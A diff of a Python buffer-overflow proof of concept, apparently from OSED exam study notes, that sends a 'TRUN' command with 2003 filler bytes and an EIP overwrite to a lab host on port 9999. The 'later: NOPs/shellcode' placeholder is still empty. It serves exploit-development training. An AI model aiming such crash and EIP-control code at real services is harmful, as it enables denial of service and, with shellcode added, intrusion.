@@ -1,28 +1,30 @@
 #https://github.com/Steven-Holder/OSED-Study-Notes/edit/OSEDLabHelpers/TestingFiller_EIP_Offset_NOPS
 import socket
 
-#Target details
+# Target details
 target_IP = "192.168.1.135"
 port = 9999
-#pattern_length = 3000
 
-filler = b"A" * 2003
-eip = b"B" * 4
-offset = b"C" * 4
-inputBuffer = filler + eip + offset
+# Payload layout
+filler = b"A" * 2003        # offset to EIP
+eip    = b"B" * 4           # overwrite EIP
+after  = b"C" * 4           # placeholder (later: NOPs/shellcode)
+padding = b"D" * 500        # extend to ensure crash
 
+inputBuffer = filler + eip + after + padding
 
-def send_payload(inputBuffer):
- try:
-		print("connecting to taget...")
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect ((target_IP, port))
-		s.send (b"TRUN /.:/" + inputBuffer)
-		print("Payload sent.")
-		s.close()
- except Exception as e:	
-		print("Connection failed:", e)
+def send_payload(payload):
+    try:
+        print("[*] Connecting to target...")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_IP, port))
+        s.send(b"TRUN /.:/" + payload)
+        print("[*] Payload sent.")
+        s.close()
+    except Exception as e:
+        print("[!] Connection failed:", e)
 
+send_payload(inputBuffer)
 
 		
 		
